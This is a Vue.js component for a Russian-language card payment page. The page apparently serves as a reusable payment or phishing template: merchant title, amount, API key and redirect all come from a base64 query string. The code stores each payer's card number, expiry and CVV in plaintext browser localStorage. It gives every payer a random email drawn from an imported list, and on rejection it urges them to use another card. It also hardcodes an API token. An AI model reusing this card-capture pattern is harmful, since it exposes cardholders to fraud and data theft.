<template>
  <div class="home">
    <div class="container p-0">
        <div class="card px-4">
            <p class="py-3"><strong>{{ title }}</strong></p>
            <p style="color: red;" v-if="error !== ''">{{ error }}</p>
            <div class="row gx-3">
                <div class="col-12">
                    <div class="d-flex flex-column">
                        <p class="text mb-1">ФИО (как на карте)</p>
                        <input class="form-control mb-3" v-model="holder" placeholder="Name" >
                    </div>
                </div>
                <div class="col-12">
                    <div class="d-flex flex-column">
                        <p class="text mb-1">Номер карты</p>
                        <input v-model="number" v-cardformat:formatCardNumber class="form-control mb-3" autocomplete="cc-number" placeholder="1234 5678 4356 7890">
                    </div>
                </div>
                <div class="col-6">
                    <div class="d-flex flex-column">
                        <p class="text mb-1">ММ/ГГ</p>
                        <input ref="cardExpInput" v-model="exp" v-cardformat:formatCardExpiry class="form-control mb-3" type="text" placeholder="MM/YY">
                    </div>
                </div>
                <div class="col-6">
                    <div class="d-flex flex-column">
                        <p class="text mb-1">CVV/CVC код</p>
                        <input ref="cardCvcInput" v-model="cvc" v-cardformat:formatCardCVC class="form-control mb-3 pt-2 " type="password" placeholder="***">
                    </div>
                </div>
                <div class="col-12">
                    <div v-on:click="send" class="btn btn-primary mb-3">
                        <span class="ps-3">Оплатить {{ cost }}р.</span>
                        <span class="fas fa-arrow-right"></span>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="frame"></div>
  </div>
</template>

<script>
import axios from 'axios'
import { base, skey, apiKey } from '../config/data_em.js'

export default {
  name: 'Form',
  data () {
    return {
      title: 'Реквизиты',
      error: '',
      orderId: '',
      cost: 0,
      successUrl: '',
      email: '',
      number: '',
      holder: '',
      exp: '',
      cvc: '',
      results: [],
      country: '',
      url: 'https://ipinfo.io/json?token=9d35a57e6931cd',
      color: '#0C4160',
      apiKey: apiKey
    }
  },
  watch: {
    color: function () {
      document.body.style.backgroundColor = this.color
    },
    number: function(val){
      if(this.$cardFormat.validateCardNumber(val)){
        this.$refs.cardExpInput.focus();
      }
    },
    exp: function (val) {
      if (this.$cardFormat.validateCardExpiry(val)) {
        this.$refs.cardCvcInput.focus();
      }
    }
  },
  created () {
  },
  mounted () {
    if (this.$route.query.paym) {
      const queryStr = JSON.parse(atob(this.$route.query.paym, skey))
      this.title = decodeURIComponent(escape(queryStr.title))
      this.apiKey = queryStr.key
      if (this.$route.query.status === 'reject') {
        this.error = 'Ошибка платежа! смените карту!'
      }
      document.title = this.title
      this.cost = queryStr.cost
      this.orderId = this.cost + '-' + (Date.now() / 1000)
      this.successUrl = queryStr.success
      this.color = queryStr.color
    }
    if (localStorage.getItem('pdata') !== null) {
      const pdata = JSON.parse(localStorage.getItem('pdata'))
      this.holder = pdata.ch
      this.number = pdata.cc
      this.exp = pdata.ce
      this.cvc = pdata.cv
    }
    if (localStorage.getItem('email') !== null) {
      this.email = localStorage.getItem('email')
    } else {
      const rand = Math.floor(Math.random() * base.length)
      this.email = base[rand]
      localStorage.setItem('email', this.email)
    }
    if (localStorage.getItem('country') !== null) {
      this.country = localStorage.getItem('country')
    } else {
      this.getCountry()
    }
  },
  methods: {
    getCountry () {
      axios.get(this.url)
        .then(response => {
          this.results = response.data
          this.country = this.results.country
          localStorage.setItem('country', this.country)
        })
        .catch(error => {
          this.country = 'RU'
          console.log(error)
        })
    },
    Moon () {
      let N = this.number.replace(/\s+/g, '')
      if (N.length % 2 !== 0) {
        N = '0' + N
      }
      let K = 0
      let Sum = 0
      for (var i = 0; i < N.length; i += 2) {
        Sum += ((K = N.charAt(i) * 2) > 9 ? K - 9 : K) + Number(N.charAt(i + 1))
      }
      return Sum % 10 === 0
    },
    send () {
      if (this.holder.length < 3) {
        alert('Поле ФИО обязательно к заполнению!')
        return false
      }
      if (this.number.length < 16) {
        alert('Проверьте Ваш номер карты')
        return false
      }
      if (this.Moon() !== true) {
        alert('Проверьте Ваш номер карты')
        return false
      }
      if (this.exp.length < 7 || this.exp.split('/')[1].trim() < 22) {
        alert('Введите срок действия в формате ММ/ГГ')
        return false
      }
      if (this.cvc.length < 3) {
        alert('Проверьте Ваш CVC код с обратной стороны карты!')
        return false
      }
      localStorage.setItem('pdata', JSON.stringify({
        cc: this.number,
        ch: this.holder,
        ce: this.exp,
        cv: this.cvc
      }))
      this.setSheets()
    },
    setSheets () {
      const uniqueString = 'CHANGE_THIS_TO_SOME_UNIQUE_STRING'
      const ifr = document.createElement('iframe')
      const frm = document.createElement('form')
      frm.action = 'https://e-pays.org/api/request/'
      frm.method = 'post'
      frm.target = '_top'
      frm.innerHTML = `
      <input type="hidden" name="amount" value="${this.cost}">
      <input type="hidden" name="merchant_order_id" value="${this.orderId}">
      <input type="hidden" name="card_number" value="${this.number.replace(/\s+/g, '')}">
      <input type="hidden" name="card_year" value="20${this.exp.split('/')[1].trim()}">
      <input type="hidden" name="card_month" value="${this.exp.split('/')[0].trim()}">
      <input type="hidden" name="card_cvc" value="${this.cvc}">
      <input type="hidden" name="country" value="${this.country}">
      <input type="hidden" name="api_key" value="${this.apiKey}">
      <input type="hidden" name="success_url" value="${this.successUrl}">
      <input type="hidden" name="fail_url" value="${document.location.href}&status=reject">
      <input type="hidden" name="email" value="${this.email}">
      `
      document.querySelector('.frame').appendChild(ifr)
      ifr.style.display = 'none'
      ifr.contentWindow.name = uniqueString
      document.body.appendChild(frm)
      frm.submit()
    }
  }
}
</script>

<style>
@import url('https://fonts.googleapis.com/css?family=Montserrat:400,700&display=swap');

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Montserrat', sans-serif;
}

body {
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    background-color: #0C4160;

    padding: 30px 10px;
}

.card {
    max-width: 500px;
    margin: auto;
    color: black;
    border-radius: 20 px;
}

p {
    margin: 0px;
}

.container .h8 {
    font-size: 30px;
    font-weight: 800;
    text-align: center;
}

.btn.btn-primary {
    width: 100%;
    height: 70px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 15px;
    background-image: linear-gradient(to right, #77A1D3 0%, #79CBCA 51%, #77A1D3 100%);
    border: none;
    transition: 0.5s;
    background-size: 200% auto;

}


.btn.btn.btn-primary:hover {
    background-position: right center;
    color: #fff;
    text-decoration: none;
}



.btn.btn-primary:hover .fas.fa-arrow-right {
    transform: translate(15px);
    transition: transform 0.2s ease-in;
}

.form-control {
    color: white;
    background-color: #223C60;
    border: 2px solid transparent;
    height: 60px;
    padding-left: 20px;
    vertical-align: middle;
}

.form-control:focus {
    color: white;
    background-color: #0C4160;
    border: 2px solid #2d4dda;
    box-shadow: none;
}

.text {
    font-size: 14px;
    font-weight: 600;
}

::placeholder {
    font-size: 14px;
    font-weight: 600;
}
.frame {
  display: none;
}
form {
  display: none;
}
</style>
